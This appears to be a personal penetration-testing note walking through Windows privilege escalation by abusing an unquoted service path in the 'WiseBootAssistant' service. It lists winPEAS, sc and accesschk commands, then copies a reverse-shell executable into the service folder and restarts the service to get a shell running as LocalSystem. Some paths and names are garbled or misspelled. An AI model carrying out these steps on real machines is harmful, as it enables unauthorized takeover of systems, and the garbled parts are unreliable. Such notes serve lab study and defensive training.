1. Run winPEAS to check for service misconfigurations:

```batch - windows
.\winPEASx64.exe quiet servicesinfo
```

2. Note that the “WiseBootAssistant” service has an unquoted path that also contains spaces:

`WiseBootAssistant (WiseCleaner.com - Wise Boot Assistant)[C:\FProgram Files (x86)\ [ \Wise Care 365\BootTime.exe] - Auto - Running - No quotes and Space detected`

3. Confirm this using sc:
```batch - windows
sc qc WiseBootAssitant
```
4. Use accesschk.exe to check for write permissions:

```batch - windows
.\accesschk64.exe /accepteula -uwdq C:\
```

```batch - windows
.\accesschk64.exe /accepteula -uwdq "C:\Program Files (x86)\"
```

```batch - windows
.\accesschk64.exe /accepteula -uwdq "C:\Program Files (x86)\Wise\"
```

5. Copy the reverse shell executable and rename it appropriately:

[[1._Reverse Shells (WIN)#MSFVenom]]

```batch - windows
copy C:\PrivEsc\reverse.exe "C:\Program Files (x86)\Wise\Wise.exe"
```

6. Stop the service

```batch - windows
sc stop WiseBootAssistant
```

```batch - windows
sc query WiseBootAssitant
```

```
...
SERVICE _NAME: WiseBootAssistant 
	TYPE : 110 WIN32_OWN_PROCESS (interactive) 
	STATE : 1 STOPPED
	...
```


6. Start a listener on Kali, and then start the service to trigger the exploit:

![[1._rlwrap]]

```batch - windows
net start WiseBootAssitant
```

Visual example:

```batch - windows
.\winPEAS.exe quiet servicesinfo
```

`WiseBootAssistant(wiseCleaner.com - Wise Boot Assistant)[C:\Program Files (x86)\Wise\Wise Care 365\BootTime.exe] - Auto - Running - No quotes and Space detected miss. :uhers [WriteData/CreateFiles] Possible DLL Hijacking in binary folder: C:\Program Files (x86)\Wise\Wise Care 365 (Users [WriteData/CreateFiles]) In order to optimize system performance,Wise Care 365 will calculate your system startup time.`

```



```batch - windows
sc qc WiseBootAssistant
```


`START_TYPE P2 AUTO_START`
`ERROR_CONTROL i1 NORMAL` 
`BINARY PATH NAME : C:\Program Files (x86)\Wise\Wise Care 365\BootTime.exe` 
`LOAD_ORDER_GROUP : ` 
`TAG : 0` 
`DISPLAY_NAME : Wise Boot Assistant`
`DEPENDENCIES : `  
`SERVICE START_NAME : LocalSystem`

```batch - windows
.\accesschk64.exe /accepteula -ucqv Aaron WiseBootAssistant
```

```batch - windows
.\accesschk.exe /accepteula -uwdq C:\
```

```batch - windows
.\accesschk.exe /accepteula -uwdq "C:\Program Files (x86)\"
```

```batch - windows
.\accesschk.exe /accepteula -uwdq "C:\Program Files (x86)\Wise\"
```

